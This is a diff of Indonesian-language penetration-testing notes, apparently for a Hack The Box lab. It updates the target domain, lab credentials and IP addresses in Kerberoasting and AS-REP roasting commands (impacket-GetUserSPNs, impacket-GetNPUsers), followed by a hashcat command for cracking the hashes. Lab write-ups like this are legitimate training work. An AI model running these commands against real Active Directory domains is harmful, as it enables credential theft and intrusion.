@@ -2,13 +2,13 @@ sistem autentikasi di windows AD tanpa harus mengirimkan password ke jaringan, t
 
 # Kerberoasting Attack
 ```shell
-impacket-GetUserSPNs danglingtree.htb/'anderson.w':'R3dT3am@Acc3ss#01' -dc-ip 10.129.29.17 -request -outputfile kerberoast_hashes.txt
+impacket-GetUserSPNs scaffold.htb/'j.harris':'Harr1sHelpdesk2026!Breach' -dc-ip 10.129.246.248 -request -outputfile kerberoast_hashes.txt
 ```
 ![](Attachments/Pasted%20image%2020260616133752.png)
 # AS-REP Roasting
 ```shell
 # menggunakan list user yang didapat dari rid brute pada enum smb sebelumnya, tidak perlu password
-impacket-GetNPUsers danglingtree.htb/ -usersfile users.txt -no-pass -dc-ip 10.129.29.17
+impacket-GetNPUsers scaffold.htb/ -usersfile SAM_users.txt -no-pass -dc-ip 10.129.246.248
 
 #Jika dapat langsung crack
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
